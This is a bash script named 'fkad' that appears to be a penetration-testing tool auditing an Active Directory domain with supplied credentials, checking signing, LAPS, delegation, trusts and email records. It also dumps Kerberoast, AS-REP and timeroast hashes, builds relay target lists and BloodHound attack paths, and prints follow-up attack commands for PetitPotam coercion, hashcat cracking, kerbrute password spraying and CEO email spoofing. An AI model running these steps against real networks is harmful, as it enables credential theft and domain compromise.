#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
GREY='\033[0;90m'
NC='\033[0m'

echo ""
echo -e "${GREY}       _____         _____         _____         _____         _____${NC}"
echo -e "${GREY}     .'     '.     .'     '.     .'     '.     .'     '.     .'     '.${NC}"
echo -e "${GREY}    /  o   o  \\   /  o   o  \\   /  o   o  \\   /  o   o  \\   /  o   o  \\${NC}"
echo -e "${GREY}   |           | |           | |           | |           | |           |${NC}"
echo -e "${GREY}   |  \     /  | |  \     /  | |  \     /  | |  \     /  | |  \     /  |${NC}"
echo -e "${GREY}    \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /   \  '---'  /${NC}"
echo -e "${GREY}     '._____.'     '._____.'     '._____.'     '._____.'     '._____.' ${NC}"
echo ""
echo -e "${GREY}    fkad by @fkxdr${NC}"
echo -e "${GREY}    https://github.com/fkxdr/fkad${NC}"
echo ""

# Parse arguments
while getopts "u:p:d:h" opt; do
  case $opt in
    u) USERNAME="$OPTARG" ;;
    p) PASSWORD="$OPTARG" ;;
    d) DC_IP="$OPTARG" ;;
    h) 
      echo "Usage: $0 -u username -p password -d dc_ip"
      exit 0
      ;;
    *) exit 1 ;;
  esac
done

# Accept domain or IP, autoresolve to IP if needed
if [ ! -z "$DC_IP" ] && ! [[ "$DC_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  DOMAIN_INPUT="$DC_IP"
  
  # Hole PDC via SRV Record
  PDC_HOST=$(dig +short SRV _ldap._tcp.pdc._msdcs.$DOMAIN_INPUT 2>/dev/null | awk '{print $4}' | sed 's/\.$//')
  
  if [ ! -z "$PDC_HOST" ]; then
    DC_IP=$(dig +short "$PDC_HOST" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    echo -e "${GREY}[*] Resolved $DOMAIN_INPUT → $DC_IP (PDC: $PDC_HOST)${NC}"
  else
    DC_IP=$(dig +short "$DOMAIN_INPUT" 2>/dev/null | grep -E '^[0-9]+\.' | head -1)
    echo -e "${GREY}[*] Resolved $DOMAIN_INPUT → $DC_IP${NC}"
  fi
  
  if [ -z "$DC_IP" ]; then
    echo -e "${RED}[!] Could not resolve: $DOMAIN_INPUT${NC}"
    exit 1
  fi
fi

# Validate
if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ] || [ -z "$DC_IP" ]; then
  echo -e "${RED}[!] Missing parameters${NC}"
  echo "Usage: $0 -u username -p password -d dc_ip"
  exit 1
fi

# Discover domain
DOMAIN=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null | grep -oP '(?<=domain:)[^)]+' | tr -d ' ')
if [ -z "$DOMAIN" ]; then
  echo -e "${RED}[KO] Failed to discover domain${NC}"
  exit 1
fi

DOMAIN_DN=$(echo "$DOMAIN" | sed 's/\./,DC=/g' | sed 's/^/DC=/')
FULL_USER="$USERNAME@$DOMAIN"

# Hostname DC
DC_HOSTNAME=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null | grep -oP '(?<=name:)[^)]+' | tr -d ' ')
if [ -z "$DC_HOSTNAME" ]; then
    # fallback auf Reverse DNS Lookup
    DC_HOSTNAME=$(dig +short -x $DC_IP 2>/dev/null | sed 's/\.$//')
fi

# Build FQDN
if [[ ! "$DC_HOSTNAME" =~ \. ]]; then
    DC_FQDN="${DC_HOSTNAME}.${DOMAIN}"
else
    DC_FQDN="$DC_HOSTNAME"
fi

# Get current directory and create output folder
CURRENT_PATH=$(pwd)
OUTPUT_DIR="$CURRENT_PATH/fkad_${DOMAIN}_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"

echo ""
echo -e "${BLUE}[*] DC FQDN   : ${DC_FQDN}${NC}"
echo -e "${BLUE}[*] DC IP     : $DC_IP${NC}"
echo -e "${BLUE}[*] Domain    : $DOMAIN${NC}"
echo ""


# ADCS/PKI Vulnerability Check
if [ -x "/opt/tools/Certipy/venv/bin/certipy" ]; then
  CERTIPY_CMD="/opt/tools/Certipy/venv/bin/certipy"
elif command -v certipy &> /dev/null; then
  CERTIPY_CMD="certipy"
elif command -v certipy-ad &> /dev/null; then
  CERTIPY_CMD="certipy-ad"
else
  CERTIPY_CMD=""
fi

if [ ! -z "$CERTIPY_CMD" ]; then
  cd "$OUTPUT_DIR"
  $CERTIPY_CMD find -u "$USERNAME" -p "$PASSWORD" -dc-ip $DC_IP -timeout 5 &>/dev/null
  cd "$CURRENT_PATH"
  
  CERTIPY_TXT=$(ls -t "$OUTPUT_DIR"/*_Certipy.txt 2>/dev/null | head -1)
  
  if [ -f "$CERTIPY_TXT" ]; then
    VULNS=$(awk '
      /^  [0-9]+$/ { current="" }
      /CA Name\s*:/ { gsub(/.*CA Name\s*:\s*/, ""); gsub(/\s*$/, ""); current="CA:" $0 }
      /Template Name\s*:/ { gsub(/.*Template Name\s*:\s*/, ""); gsub(/\s*$/, ""); current="Template:" $0 }
      /\[!\] Vulnerabilities/ { in_vuln=1; next }
      in_vuln && /^\s+ESC[0-9]+/ { 
        match($0, /ESC[0-9]+/); 
        esc=substr($0, RSTART, RLENGTH);
        if (current != "") print current "|" esc
      }
      in_vuln && /^  [0-9]+$|^Certificate Templates|^Certificate Authorities/ { in_vuln=0 }
    ' "$CERTIPY_TXT" | sort -u)
    
    if [ ! -z "$VULNS" ]; then
      echo -e "${RED}[KO] ADCS vulnerabilities found → adcs_certipy.txt${NC}"
      
      declare -A GROUPED
      while IFS='|' read -r name esc; do
        if [ -z "${GROUPED[$name]}" ]; then
          GROUPED[$name]="$esc"
        else
          GROUPED[$name]="${GROUPED[$name]}, $esc"
        fi
      done <<< "$VULNS"
      
      for name in "${!GROUPED[@]}"; do
        echo -e "${RED}       └─ $name: ${GROUPED[$name]}${NC}"
        echo "$name: ${GROUPED[$name]}" >> "$OUTPUT_DIR/adcs_certipy.txt"
      done
    else
      echo -e "${GREEN}[OK] ADCS detected, no exploitable vulnerabilities${NC}"
    fi
  else
    echo -e "${GREY}[--] No ADCS/PKI infrastructure detected${NC}"
  fi
else
  echo -e "${GREY}[--] Certipy not found, skipping ADCS check${NC}"
fi

# LDAP Signing & Channel Binding
LDAP_CHECK=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
LDAP_SIGNING_OFF=$(echo "$LDAP_CHECK" | grep -q "signing:None" && echo "1")
LDAP_CB_OFF=$(echo "$LDAP_CHECK" | grep -q "channel binding:No" && echo "1")

if [ "$LDAP_SIGNING_OFF" = "1" ] && [ "$LDAP_CB_OFF" = "1" ]; then
  echo -e "${RED}[KO] LDAP Signing + Channel Binding NOT enforced (NTLM Relay to LDAP possible)${NC}"
elif [ "$LDAP_SIGNING_OFF" = "1" ]; then
  echo -e "${RED}[KO] LDAP Signing NOT enforced${NC}"
  echo -e "${GREEN}       └─ Not Exploitable: Channel Binding enabled${NC}"
elif [ "$LDAP_CB_OFF" = "1" ]; then
  echo -e "${RED}[KO] LDAP Channel Binding NOT enforced${NC}"
  echo -e "${GREEN}       └─ Not Exploitable: LDAP Signing enabled${NC}"
else
  echo -e "${GREEN}[OK] LDAP Signing + Channel Binding enforced${NC}"
fi

# SMB Signing Check
SMB_DC_CHECK=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" 2>/dev/null)
if echo "$SMB_DC_CHECK" | grep -q "signing:True"; then
  echo -e "${GREEN}[OK] SMB Signing enforced on DC${NC}"
else
  echo -e "${RED}[KO] SMB Signing NOT enforced on DC${NC}"
fi

# Scan subnet for relay targets
SUBNET=$(echo "$DC_IP" | cut -d'.' -f1-3)
nxc smb ${SUBNET}.0/24 -u "$USERNAME" -p "$PASSWORD" --gen-relay-list "$OUTPUT_DIR/relay_targets.txt" &>/dev/null
RELAY_COUNT=$(wc -l < "$OUTPUT_DIR/relay_targets.txt" 2>/dev/null || echo 0)

if [ "$RELAY_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $RELAY_COUNT host(s) without SMB Signing in ${SUBNET}.0/24 → relay_targets.txt${NC}"
else
  echo -e "${GREEN}[OK] All hosts in ${SUBNET}.0/24 have SMB Signing${NC}"
  rm -f "$OUTPUT_DIR/relay_targets.txt"
fi
echo -e "${GREY}       nxc smb <SUBNET>/24 -u '$USERNAME' -p '$PASSWORD' --gen-relay-list '$OUTPUT_DIR/relay_targets.txt'${NC}"

# LAPS Check
LAPS_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
  "(name=ms-Mcs-AdmPwd)" name 2>/dev/null | grep -c "name: ms-Mcs-AdmPwd")

LAPS_NEW_SCHEMA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=Schema,CN=Configuration,$DOMAIN_DN" \
  "(name=msLAPS-Password)" name 2>/dev/null | grep -c "name: msLAPS-Password")

if [ "$LAPS_SCHEMA" -gt 0 ] || [ "$LAPS_NEW_SCHEMA" -gt 0 ]; then
  # Check if we can read any LAPS passwords
  LAPS_READABLE=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M laps 2>/dev/null | grep -v "No result found" | grep -c "Password:")
  
  if [ "$LAPS_READABLE" -gt 0 ]; then
    echo -e "${RED}[KO] LAPS deployed - passwords readable by current user${NC}"
  else
    echo -e "${GREEN}[OK] LAPS deployed - passwords not readable by current user${NC}"
  fi
else
  echo -e "${RED}[KO] LAPS not deployed${NC}"
fi

# DES Encryption Check
DES_USERS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(userAccountControl:1.2.840.113556.1.4.803:=2097152)" sAMAccountName 2>/dev/null | \
  grep "^sAMAccountName:" | awk '{print $2}')

DES_COUNT=$(echo "$DES_USERS" | grep -v "^$" | wc -l)

if [ "$DES_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $DES_COUNT user(s) with DES-only Kerberos encryption:${NC}"
  echo "$DES_USERS" | while read -r user; do
    [ ! -z "$user" ] && echo -e "${RED}       └─ $user${NC}"
  done
else
  echo -e "${GREEN}[OK] No users with DES-only Kerberos encryption${NC}"
fi

# Unconstrained Delegation Check
UNCON_SYSTEMS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" sAMAccountName 2>/dev/null | \
  grep "^sAMAccountName:" | awk '{print $2}')

NON_DC_UNCON=$(echo "$UNCON_SYSTEMS" | grep -vi "DC[0-9]*\$" | grep -v "^$")
NON_DC_COUNT=$(echo "$NON_DC_UNCON" | grep -v "^$" | wc -l)

if [ "$NON_DC_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $NON_DC_COUNT non-DC system(s) with Unconstrained Delegation${NC}"
  while IFS= read -r system; do
    [ ! -z "$system" ] && echo -e "${RED}       └─ $system${NC}"
  done <<< "$NON_DC_UNCON"
else
  echo -e "${GREEN}[OK] No Unconstrained Delegation on non-DC systems${NC}"
fi

# Print Spooler Check on DC
SPOOLER_CHECK=$(nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M spooler 2>/dev/null)
if echo "$SPOOLER_CHECK" | grep -qi "Spooler.*enabled\|TRUE"; then
  echo -e "${RED}[KO] Print Spooler running on DC $DC_HOSTNAME${NC}"
  
  # Check for non-DC unconstrained delegation
  NON_DC_UNCON=$(echo "$UNCON_SYSTEMS" | grep -v "DC[0-9]*\$" | grep -v "^$")
  if [ ! -z "$NON_DC_UNCON" ]; then
    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
  else
    echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets (DCs only)${NC}"
  fi
  echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
elif echo "$SPOOLER_CHECK" | grep -qi "STATUS_PIPE_NOT_AVAILABLE"; then
  echo -e "${GREEN}[OK] Print Spooler disabled on DC${NC}"
else
  echo -e "${GREY}[--] Print Spooler status unknown${NC}"
fi

# WPAD
WPAD_DNS=$(nslookup wpad.$DOMAIN $DC_IP 2>&1)
if echo "$WPAD_DNS" | grep -q "can't find"; then
  echo -e "${RED}[KO] No WPAD DNS entry (WPAD Poisoning)${NC}"
else
  echo -e "${GREEN}[OK] WPAD DNS entry exists${NC}"
fi

# IPv6 DNS Check
IPV6_ENABLED=$(dig +short AAAA $DC_HOSTNAME 2>/dev/null)
if [ -z "$IPV6_ENABLED" ]; then
  echo -e "${RED}[KO] No IPv6 DNS record for DC (DHCPv6 DNS Takeover via mitm6)${NC}"
else
  echo -e "${GREEN}[OK] IPv6 DNS configured for DC${NC}"
fi

echo ""

# Create domain_users.txt
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --active-users > "$OUTPUT_DIR/active.txt" 2>/dev/null
if [ -f "$OUTPUT_DIR/active.txt" ]; then
  tail "$OUTPUT_DIR/active.txt" -n +5 | awk -F ' ' '{ print $5 }' > "$OUTPUT_DIR/domain_users.txt"
  USER_COUNT=$(wc -l < "$OUTPUT_DIR/domain_users.txt" 2>/dev/null)
  echo -e "${GREEN}[OK] Enumerated $USER_COUNT active users → domain_users.txt${NC}"
  rm -f "$OUTPUT_DIR/active.txt"
else
  echo -e "${GREY}[??] Failed to enumerate users${NC}"
fi

# Enumerate users with descriptions
DESC_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -M get-desc-users 2>/dev/null)

if echo "$DESC_OUTPUT" | grep -q "User:"; then
  # Extract just the user:description lines and save to file
  echo "$DESC_OUTPUT" | grep "User:" | sed 's/.*User: //' > "$OUTPUT_DIR/user_descriptions.txt"
  DESC_COUNT=$(wc -l < "$OUTPUT_DIR/user_descriptions.txt" 2>/dev/null)
  echo -e "${GREEN}[OK] $DESC_COUNT user(s) with descriptions → user_descriptions.txt${NC}"
else
  echo -e "${GREEN}[OK] No users with descriptions found${NC}"
fi

# Bloodhound Export
if command -v bloodhound-python &>/dev/null || command -v bloodhound.py &>/dev/null; then
  BH_CMD=$(command -v bloodhound-python 2>/dev/null || command -v bloodhound.py 2>/dev/null)
  $BH_CMD -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" -dc "${DC_FQDN}" -ns "$DC_IP" -c All &>/dev/null

  # Check for BloodHound JSONs
  BH_JSON=$(ls -1 ${CURRENT_PATH}/*.json 2>/dev/null | wc -l)
  if [ "$BH_JSON" -gt 0 ]; then
    mv ${CURRENT_PATH}/*.json "$OUTPUT_DIR/" 2>/dev/null
    echo "$USERNAME:password:$PASSWORD" > "$OUTPUT_DIR/owned"
        echo -e "${GREEN}[OK] Bloodhound and owned file complete → ${BH_JSON} JSON file(s)${NC}"

    # Check/Install GriffonAD
    GRIFFON_PATH="/workspace/GriffonAD"
    if [ ! -d "$GRIFFON_PATH" ]; then
      echo -e "${GREY}[→] Installing GriffonAD...${NC}"
      cd /workspace
      git clone https://github.com/shellinvictus/GriffonAD &>/dev/null 2>&1
      if [ -d "$GRIFFON_PATH" ]; then
        cd "$GRIFFON_PATH"
        pip install -r requirements.txt &>/dev/null 2>&1
        cd "$CURRENT_PATH"
        echo -e "${GREEN}[OK] GriffonAD installed${NC}"
      fi
    fi
    
    # Patch GriffonAD for empty GPO GUIDs
    if [ -f "$GRIFFON_PATH/lib/database.py" ]; then
      if ! grep -q "if gpo_guid and gpo_guid in self.objects_by_sid" "$GRIFFON_PATH/lib/database.py"; then
        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.append(o.dn)/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.append(o.dn)/' "$GRIFFON_PATH/lib/database.py"
        sed -i 's/self.objects_by_sid\[gpo_guid\].gpo_links_to_ou.sort()/if gpo_guid and gpo_guid in self.objects_by_sid: self.objects_by_sid[gpo_guid].gpo_links_to_ou.sort()/' "$GRIFFON_PATH/lib/database.py"
        echo -e "${GREY}[→] Patched GriffonAD for empty GPO GUIDs${NC}"
      fi
    fi

    # Run GriffonAD
    if [ -f "$GRIFFON_PATH/griffon.py" ]; then
      cd "$OUTPUT_DIR"
      JSON_FILES=( *.json )
      if [ ${#JSON_FILES[@]} -gt 0 ] && [ -f "${JSON_FILES[0]}" ]; then
        GRIFFON_OUTPUT=$(python3 "$GRIFFON_PATH/griffon.py" --fromo *.json 2>&1)
        if echo "$GRIFFON_OUTPUT" | grep -q "No paths found"; then
          echo -e "${GREEN}[OK] GriffonAD found no attack paths${NC}"
        elif echo "$GRIFFON_OUTPUT" | grep -qE "(->|—>)"; then
          PATHS=$(echo "$GRIFFON_OUTPUT" | grep -cE "(->|—>)")
          echo -e "${RED}[KO] GriffonAD found $PATHS attack path(s) → griffon_paths.txt${NC}"
          echo "$GRIFFON_OUTPUT" | grep -E "(->|—>)" | while read -r path; do
            # Extract target from path (last element after last colon or arrow)
            TARGET=$(echo "$path" | grep -oE '[A-Za-z0-9_$]+$')
            echo -e "${RED}       └─ $TARGET${NC}"
          done
          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_paths.txt"
        else
          echo -e "${GREY}[--] GriffonAD returned no results (something probably broke)${NC}"
          echo "$GRIFFON_OUTPUT" > "$OUTPUT_DIR/griffon_debug.txt"
        fi
      else
        echo -e "${GREY}[--] No JSON files found for GriffonAD${NC}"
      fi
      cd "$CURRENT_PATH"
    else
      echo -e "${GREY}[--] GriffonAD not found${NC}"
    fi
  else
    echo -e "${GREY}[--] BloodHound export failed${NC}"
  fi
else
  echo -e "${GREY}[--] Bloodhound-python not found, skipping collection${NC}"
fi

# Bloodhound Info (ZIP for BloodHound CE)
CONTAINER_NAME=$(hostname)
cd "$OUTPUT_DIR"
zip -q bloodhound.zip *.json
cd "$CURRENT_PATH"

echo ""

# MachineAccountQuota Check
MAQ=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(objectClass=domain)" ms-DS-MachineAccountQuota 2>/dev/null | grep "ms-DS-MachineAccountQuota:" | awk '{print $2}')

if [ ! -z "$MAQ" ]; then
  if [ "$MAQ" -gt 0 ]; then
    echo -e "${RED}[KO] MachineAccountQuota: $MAQ (Users can create computer objects)${NC}"
  else
    echo -e "${GREEN}[OK] MachineAccountQuota: 0 (Computer creation restricted)${NC}"
  fi
else
  echo -e "${GREY}[--] Could not determine MachineAccountQuota${NC}"
fi

# Password policy
POL_OUT=$(nxc smb "$DC_IP" -u "$USERNAME" -p "$PASSWORD" --pass-pol 2>/dev/null)

MIN_PW_LENGTH=$(echo "$POL_OUT" | grep -i 'Minimum password length' | awk -F: '{print $2}' | tr -d ' ' )
LOCKOUT_THRESHOLD=$(echo "$POL_OUT" | grep -i 'Account Lockout Threshold' | awk -F: '{print $2}' | tr -d ' ' )
[ -z "$MIN_PW_LENGTH" ] && MIN_PW_LENGTH="unknown"
[ -z "$LOCKOUT_THRESHOLD" ] && LOCKOUT_THRESHOLD="unknown"

if [ "$MIN_PW_LENGTH" = "unknown" ]; then
  echo -e "${GREY}[--] Minimum password length: unknown${NC}"
else
  if [ "$MIN_PW_LENGTH" -lt 14 ] 2>/dev/null; then
    echo -e "${RED}[KO] Minimum password length: $MIN_PW_LENGTH (<14)${NC}"
  else
    echo -e "${GREEN}[OK] Minimum password length: $MIN_PW_LENGTH${NC}"
  fi
fi

if [ "$LOCKOUT_THRESHOLD" = "unknown" ]; then
  echo -e "${GREY}[--] Account Lockout Threshold: unknown${NC}"
else
  if [ "$LOCKOUT_THRESHOLD" -ge 5 ] 2>/dev/null; then
    echo -e "${GREEN}[OK] Account Lockout Threshold: $LOCKOUT_THRESHOLD (>=5)${NC}"
  else
    echo -e "${RED}[KO] Account Lockout Threshold: $LOCKOUT_THRESHOLD (<5)${NC}"
  fi
fi
echo -e "${GREY}[--] kerbrute passwordspray -d ${DOMAIN} '${OUTPUT_DIR}/domain_users.txt' --user-as-pass${NC}"

echo ""

# Ghost SPN Check
GHOST_SPNS=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "$DOMAIN_DN" \
  "(&(objectClass=computer)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName 2>/dev/null | \
  awk '/^sAMAccountName:/ {comp=$2} /^servicePrincipalName:/ {print comp":"$2}')

if [ ! -z "$GHOST_SPNS" ]; then
  GHOST_COUNT=0
  GHOST_LIST=""
  
  while IFS=: read -r computer spn; do
    if [[ "$spn" =~ ^[^/]+/([^:/]+) ]]; then
      spn_host="${BASH_REMATCH[1]}"
      
      # Skip GUIDs, Azure, Microsoft domains
      [[ "$spn_host" =~ ^[0-9a-f]{8}-[0-9a-f]{4} ]] && continue
      [[ "$spn_host" =~ nsatc\.net$ ]] && continue
      [[ "$spn_host" =~ windows\.net$ ]] && continue
      [[ "$spn_host" =~ microsoft\.com$ ]] && continue
      
      # Normalize computer name
      computer_clean="${computer%\$}"
      computer_clean="${computer_clean,,}"
      
      # Extract hostname from SPN
      spn_hostname="${spn_host%%.*}"
      spn_hostname="${spn_hostname,,}"
      
      # Skip if SPN matches computer name (normal)
      [[ "$spn_hostname" == "$computer_clean" ]] && continue
      
      # Add domain if not FQDN
      if [[ ! "$spn_host" =~ \. ]]; then
        spn_fqdn="${spn_host}.${DOMAIN}"
      else
        spn_fqdn="$spn_host"
      fi
      
      # Check DNS
      DNS_RESULT=$(dig +short +time=2 +tries=2 "$spn_fqdn" @$DC_IP 2>/dev/null)
      
      if [ -z "$DNS_RESULT" ]; then
        GHOST_COUNT=$((GHOST_COUNT + 1))
        GHOST_LIST="${GHOST_LIST}${RED}       └─ ${computer}: ${spn}${NC}\n"
      fi
    fi
  done <<< "$GHOST_SPNS"
  
  if [ "$GHOST_COUNT" -gt 0 ]; then
    echo -e "${RED}[KO] $GHOST_COUNT Ghost SPN(s) found (potential SPN hijacking)${NC}"
    echo -e "$GHOST_LIST"
  else
    echo -e "${GREEN}[OK] No Ghost SPNs found${NC}"
  fi
else
  echo -e "${GREY}[--] Could not enumerate SPNs${NC}"
fi

# Kerberoasting Check
KERBEROAST_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --kerberoasting "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
KERBEROAST_COUNT=$(grep -c '\$krb5tgs\$' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null)
KERBEROAST_COUNT=${KERBEROAST_COUNT:-0}

if [ "$KERBEROAST_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $KERBEROAST_COUNT Kerberoastable account(s) found → kerberoast.txt${NC}"
  grep -oP '(?<=\*)[^$]+(?=\$)' "$OUTPUT_DIR/kerberoast.txt" 2>/dev/null | while read -r account; do
    echo -e "${RED}       └─ $account${NC}"
  done
    echo -e "${GREY}       hashcat -m 13100 '$OUTPUT_DIR/kerberoast.txt' /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule${NC}"

else
  echo -e "${GREEN}[OK] No Kerberoastable accounts found${NC}"
  rm -f "$OUTPUT_DIR/kerberoast.txt"
fi

# AS-REP Roasting Check
ASREP_OUTPUT=$(nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" --asreproast "$OUTPUT_DIR/asrep.txt" 2>/dev/null)
ASREP_COUNT=$(grep -c '$krb5asrep$' "$OUTPUT_DIR/asrep.txt" 2>/dev/null || echo 0)

if [ "$ASREP_COUNT" -gt 0 ]; then
  echo -e "${RED}[KO] $ASREP_COUNT AS-REP roastable account(s) found → asrep.txt${NC}"
  grep -oP '(?<=\$)[^@]+(?=@)' "$OUTPUT_DIR/asrep.txt" 2>/dev/null | while read -r account; do
    echo -e "${RED}       └─ $account${NC}"
  done
  echo -e "${GREY}       hashcat -m 18200 asrep.txt wordlist.txt${NC}"
else
  echo -e "${GREEN}[OK] No AS-REP roastable accounts found${NC}"
  rm -f "$OUTPUT_DIR/asrep.txt"
fi

# Timeroasting Check
TIMEROAST_OUTPUT=$(timeout 60 nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -M timeroast -o RIDS=500-5000 2>/dev/null)
TIMEROAST_HASHES=$(echo "$TIMEROAST_OUTPUT" | grep -c '\$sntp-ms\$')
if [ "$TIMEROAST_HASHES" -gt 0 ]; then
  echo -e "${RED}[KO] $TIMEROAST_HASHES Timeroastable account(s) found${NC}"
  echo "$TIMEROAST_OUTPUT" | grep '\$sntp-ms\$' > "$OUTPUT_DIR/timeroast.txt"
else
  echo -e "${GREEN}[OK] No Timeroastable accounts found${NC}"
fi

echo ""

# Domain Trusts + SID Filtering Check
TRUST_DATA=$(ldapsearch -x -H ldap://$DC_IP -D "$FULL_USER" -w "$PASSWORD" \
  -b "CN=System,$DOMAIN_DN" \
  "(objectClass=trustedDomain)" cn trustDirection trustAttributes 2>/dev/null)

TRUST_COUNT=$(echo "$TRUST_DATA" | grep -c "^cn:")

if [ "$TRUST_COUNT" -gt 0 ]; then
  echo -e "${GREY}[--] $TRUST_COUNT Domain Trust(s) found${NC}"
  
echo "$TRUST_DATA" | awk '
    /^cn:/ { cn=$2 }
    /^trustDirection:/ { dir=$2 }
    /^trustAttributes:/ { 
      attr=$2
      if (dir == 1) direction = "Inbound"
      else if (dir == 2) direction = "Outbound"
      else if (dir == 3) direction = "Bidirectional"
      else direction = "Unknown"
      
      is_forest = and(attr, 64)
      if (is_forest) {
        ttype = "Forest"
        sidfilter = and(attr, 4) ? "Yes" : "No"
      } else {
        ttype = "External"
        sidfilter = "Yes"
      }
      printf "%s|%s|%s|%s\n", cn, direction, ttype, sidfilter
    }
  ' | while IFS='|' read -r name direction ttype sidfilter; do
    if [ "$sidfilter" = "No" ]; then
      echo -e "${RED}[KO] $name ($direction $ttype Trust) - SID Filtering: off${NC}"
      echo -e "${RED}       └─ SID History Injection possible${NC}"
    else
      echo -e "${GREEN}[OK] $name ($direction $ttype Trust) - SID Filtering: on${NC}"
    fi
  done
else
  echo -e "${GREEN}[OK] No Domain Trusts found${NC}"
fi

# Email Security (SPF/DMARC)
SPF_CHECK=$(dig txt $DOMAIN +short 2>/dev/null | grep "v=spf1")
DMARC_CHECK=$(dig txt _dmarc.$DOMAIN +short 2>/dev/null | grep "v=DMARC1")
MX_SERVER=$(dig mx $DOMAIN +short 2>/dev/null | sort -n | head -1 | awk '{print $2}' | sed 's/\.$//')

if [ -z "$SPF_CHECK" ] && [ -z "$DMARC_CHECK" ]; then
  echo -e "${RED}[KO] No SPF + No DMARC (Email Spoofing possible)${NC}"
  echo -e "${GREY}       swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
elif [ -z "$SPF_CHECK" ]; then
  echo -e "${RED}[KO] No SPF record (Email Spoofing possible)${NC}"
  echo -e "${GREY}       swaks --to target@$DOMAIN --from ceo@$DOMAIN --server $MX_SERVER --header 'Subject: Test' --body 'Spoofing-Test'${NC}"
elif [ -z "$DMARC_CHECK" ]; then
  echo -e "${RED}[KO] No DMARC record (SPF without enforcement, no spoofing possible)${NC}"
else
  echo -e "${GREEN}[OK] SPF + DMARC configured${NC}"
fi

echo ""
echo -e "${GREY}[--] Copy results to host: docker cp ${CONTAINER_NAME}:${OUTPUT_DIR} ~/Downloads/${NC}"
echo ""
